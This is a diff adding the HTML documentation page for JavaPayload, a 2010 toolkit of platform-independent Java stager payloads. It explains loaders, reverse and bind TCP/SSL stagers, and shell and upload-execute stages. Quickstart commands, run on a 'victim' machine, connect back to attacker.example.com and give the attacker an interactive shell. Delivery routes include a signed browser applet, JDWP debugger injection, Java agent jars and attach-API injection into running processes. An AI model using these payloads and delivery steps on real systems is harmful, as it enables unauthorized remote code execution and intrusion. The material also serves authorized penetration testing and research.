@@ -1,0 +1,208 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<style type="text/css">
+body { font-family: Verdana, Arial, sans-serif;  font-size: 10pt;}
+p {margin-left: 2em; margin-right: 2em;}
+</style>
+<title>JavaPayload - Java Stager Payloads</title>
+</head>
+<body>
+<h1>JavaPayload - Platform independent Java stager payloads</h1>
+
+<p><i>&copy; 2010 Michael 'mihi' Schierl, <tt>&lt;schierlm at users dot sourceforge dot net&gt;</tt></i></p>
+
+<p><a href="JavaPayload-0.1.zip">Download JavaPayload-0.1.zip</a> (both source and compiled classes, 138 KB)</p>
+
+<h2>Introduction</h2>
+
+<p>There are very good frameworks available (like Metasploit) to exploit vulnerabilities in native applications.
+They also support exploiting Java applications, but usually only provide platform-dependent native payloads (with focus
+on Microsoft Windows platforms). When exploiting a vulnerability in a Java service or a vulnerability in the
+Java browser plugin, it is not always clear which operating system you are targeting. In this case, pure Java
+payloads can increase the chance of successful exploitation if the platform was guessed wrong.</p>
+
+<p>This archive contains a collection of pure Java payloads, from simple Shell and UpExec payloads (which need - to some
+degree - platform dependent parameters), to a <tt>JSh</tt> ("Java Shell") payload that supports an interactive shell to
+query system properties, run applications, open TCP connections, navigate the filesystem and read/write text files.
+Basic job control enables to run more than one command or TCP session via a single exploited session.</p>
+
+<p>These payloads are modular, consisting of three parts: loaders, stagers and stages. For more details refer to the
+sections below. Loaders, stagers and stages can be combined arbitrarily, and the stages and stagers can also be
+used to integrate them into other exploit frameworks like Metasploit (if you are more Ruby-literate than me).</p>
+
+<h3>Loaders</h3>
+
+<p>Loaders are similar to exploits in Metasploit. They are responsible for loading the stager and executing it. As
+the loaders included in this package do not really exploit vulnerabilities, I have named them loaders and not
+exploits. Included loaders are standalone Java program loader (to load the payload via a remote upload/command
+execution vulnerability), an Applet loader (to load the payload as a signed applet), am  "Agent" loader (to 
+load the payload from an Agent Jar from disk into another Java process) and a JDWP 
+loader (to load the payload into a process via the Java Debugger Wire Protocol without touching the disk on
+the target machine - either an existing Java process that has a debugger port open or a new one loaded by remote
+command execution of "<tt>java -Xrunjdwp:transport=dt_socket,suspend=y,server=y,address=9821</tt>").</p>
+
+<p>The standalone loader can be started either from the original Jar file, from a custom-tailored Jar file that
+includes only the needed classes, or from a custom-tailored Class file which is created on demand by the 
+ObjectWeb ASM toolkit. Parameters for stagers and stages can be either embedded into the tailored jar/class file
+or provided on the command line. Applets are always built as jar files and load their parameters from the
+<tt>&lt;param&gt;</tt> tags from the HTML. Agent jars receive their parameters via the command line. The JDWP 
+loader will create a new byte array in the target JVM, fill it with the class file, load it and invoke it.</p>
+
+<h3>Stagers</h3>
+
+<p>Stagers are responsible for obtaining a TCP connection (or any other connection providing both an InputStream 
+and an OutputStream) to the attacker and loading the stages dynamically. A stager is a single class file
+that extends the <tt>javapayload.stager.Stager</tt> class and does not depend on any other classes. It may implement
+additional interfaces which are part of the Java API, but no custom interfaces. And it may not have any 
+explicit constructors or inner classes.
+(If the stager does not follow these principles, it will not work in combination with loaders that build
+custom-tailored Jar or Class files). The stager will then obtain a list of classes (as byte arrays, prefixed with
+a 32-bit length field; the last one is followed by a length field of zero), load them, and instantiate the last one
+of them (which is expected to implement the <tt>javapayload.stage.Stage</tt> interface).</p>
+
+<p>Included stagers are BindTCP, ReverseTCP, ReverseSLL (without certificate checking), and a LocalTest stager
+that runs the stager in the same Java process which is used for the handler (useful for debugging more complex
+stages). All these stagers (except the LocalTest one) will need a hostname and a port number as parameters.</p>
+
+<h3>Stages</h3>
+
+<p>Stages are loaded by a stager and responsible for doing what you want to do on the victim's host (like provide a
+shell or execute an uploaded file). The included stages are Exec (execute a command with parameters), 
+UpExec (upload a file and execute it with parameters), Shell (execute a shell based on operating system, 
+cmd.exe for Windows and /bin/sh for everything else) and JSh (try it yourself, it is awesome). All these
+stages will forward stdin, stdout and stderr streams automatically. Shell and JSh do not need parameters, the other
+two expect a command name and optional arguments - for UpExec the command name should be an absolute file name
+on the attacker's machine, which will be uploaded to the temp directory and executed there.</p>
+
+<h2>System requirements</h2>
+
+<p><b>On the "attacker" machine:</b> Java Runtime Environment or Java Development Kit 1.4 or newer
+(JDK 6.0 recommended)</p>
+
+<p><b>On the "victim" machine:</b> Java Runtime Environment 1.2 or newer (1.4 for SSL stagers)</p>
+
+<h2>Quickstart</h2>
+
+<p>When calling a loader, you can pass it parameters. The first parameter will always be the name of the stager
+(case sensitive as it is sometimes used to load the class), followed by the stager parameters (usually
+host and port). After them, there is a parameter consisting of only two dashes ("<tt>--</tt>") which is used to
+separate stage arguments from stager arguments. After the dashes is the name of the stage (which is case sensitive
+as well) and the stage parameters (command line). All the parameters are forwarded to the stage (to keep the stagers
+small), so if you want to write your own stages, you'll have to find the double-dash yourself.</p>
+
+<p>On the attacker's side there is a <i>handler</i> which is used to upload the correct classes to the stager
+and forward streams. The included command-line handler is called <tt>javapayload.handler.stager.StagerHandler</tt> and
+expects the same parameters that were passed to the loader. (The loader and the stager will know themselves
+that they do not need a host name when they listen, but it should be in the command line nevertheless to make
+command lines more uniform).</p>
+
+<p>In the following examples I assume that you have <tt>JavaPayload.jar</tt> in your classpath; for some examples,
+the ASM libraries and/or the JDK's <tt>tools.jar</tt> have to be in the classpath as well.</p>
+
+<p>The examples use the <tt>ReverseSSL</tt> stager and the <tt>JSH</tt> stage; all the other stagers/stages can be used as well.</p>
+
+<h3>Testing/Debugging a stage on the local machine</h3>
+
+<p><tt>java javapayload.handler.stager.StagerHandler LocalTest -- JSh</tt></p>
+
+<h3>Standalone example (using custom-tailored JAR file)</h3>
+
+<p><b>On the "attacker" machine:</b></p>
+<p><tt>java javapayload.builder.JarBuilder ReverseSSL</tt></p>
+<p>copy ReverseSSL_JSh.jar to the victim machine. &mdash; or &mdash; copy JavaPayload.jar to the victim machine</p>
+<p><tt>java javapayload.handler.stager.StagerHandler ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+
+<p><b>On the "victim" machine:</b></p>
+<p><tt>java -jar ReverseSSL_JSh.jar ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+<p>&mdash; or &mdash;</p>
+<p><tt>java -cp JavaPayload.jar javapayload.loader.StandaloneLoder ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+
+<h3>Standalone example (using custom-tailored JAR file with embedded parameters)</h3>
+
+<p><b>On the "attacker" machine:</b></p>
+<p><tt>java javapayload.builder.EmbeddedJarBuilder ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+<p>copy embedded.jar to the victim's machine.</p>
+<p><tt>java javapayload.handler.stager.StagerHandler ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+
+<p>On the "victim" machine:</p>
+
+<p><tt>java -jar embedded.jar</tt></p>
+
+<h3>Standalone example (using custom-tailored Class file)</h3>
+
+<p><b>On the "attacker" machine:</b></p>
+<p><tt>java javapayload.builder.ClassBuilder ReverseSSL FunnyClass</tt></p>
+<p>copy FunnyClass.class to the victim machine.</p>
+<p><tt>java javapayload.handler.stager.StagerHandler ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+
+<p><b>On the "victim" machine:</b></p>
+<p><tt>java FunnyClass ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+
+<h3>Standalone example (using custom-tailored Class file with embedded parameters)</h3>
+
+<p><b>On the "attacker" machine:"</b></p>
+<p><tt>java javapayload.builder.EmbeddedClassBuilder FunnyClass2 ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+<p>copy FunnyClass2 to the victim's machine.</p>
+<p><tt>java javapayload.handler.stager.StagerHandler ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+
+<p>On the "victim" machine:</p>
+
+<p><tt>java FunnyClass2</tt></p>
+
+<h3>Applet example</h3>
+
+<p><b>On the "attacker" machine:</b></p>
+
+<p>Create an <tt>index.html</tt> page with the following content:<br />
+<tt>&lt;applet archive="Applet_ReverseTCP.jar" code="javapayload.loader.AppletLoader"&gt;</tt><br />
+<tt>&lt;param name="argc" value="5"&gt;</tt><br />
+<tt>&lt;param name="arg0" value="ReverseSSL" /&gt;</tt><br />
+<tt>&lt;param name="arg1" value="attacker.example.com" /&gt;</tt><br />
+<tt>&lt;param name="arg2" value="2010" /&gt;</tt><br />
+<tt>&lt;param name="arg3" value="--" /&gt;</tt><br />
+<tt>&lt;param name="arg4" value="JSh" /&gt;</tt><br />
+<tt>&lt;/applet&gt;</tt></p>
+
+<p>Run the following commands:<br />
+<tt>java javapayload.builder.AppletJarBuilder ReverseTCP</tt><br />
+<tt>keytool -keystore tmp -genkey</tt><br />
+<tt>jarsigner -keystore tmp Applet_ReverseTCP.jar mykey</tt><br />
+<tt>java javapayload.handler.stager.StagerHandler ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+
+<p>Load index.html on the "victim" machine in a Java-enabled web browser.</p>
+
+<h3>JDWP example</h3>
+
+<p><b>On the "attacker" machine:</b></p>
+<p><tt>java javapayload.builder.JDWPInjector 2010 ReverseSSL attacker.example.com 2010 --  JSh</tt></p>
+
+<p><b>On the "victim" machine:</b></p>
+<p><tt>java -Xrunjdwp:transport=dt_socket,suspend=y,server=n,address=attacker.example.com:2010</tt></p>
+
+<p><i>Note:</i> As shown in this example, the same port can be used for both the JDWP connection and the reverse
+TCP or SSL connection. You can also use different ports, if preferred.</p>
+
+<h3>Agent example (loading the agent jar into a new Java process that runs a different program)</h3>
+<p>This example requires Java 1.5 or above on both attacker and victim computer!</p>
+
+<p><b>On the "attacker" machine:</b></p>
+
+<p><tt>java javapayload.builder.AgentJarBuilder ReverseSSL</tt></p>
+<p>copy Agent_ReverseSSL.jar to the victim's machine.</p>
+<p><tt>java javapayload.handler.stager.StagerHandler ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+
+<p><b>On the "victim" machine:</b></p>
+
+<p><tt>java -javaagent:path\to\Agent_ReverseSSL.jar="ReverseSSL attacker.example.com 2010 -- JSh" 
+<i>&lt;parameters for another Java program&gt;</i></tt></p>
+
+<h3>Attach example (loading the Agent jar into an existing process on the same machine via Attach API)</h3>
+<p>This example requires Java 1.6 or above on your computer! Start any other Java program and look up its pid
+first!</p>
+
+<p><tt>java javapayload.builder.AgentJarBuilder ReverseSSL</tt></p>
+<p><tt>java javapayload.builder.AttachInjector <i>&lt;pid&gt;</i> \absolute\path\to\Agent_ReverseSSL.jar ReverseSSL localhost 2010 -- JSh</tt></p>
+
+</body>
+</html>
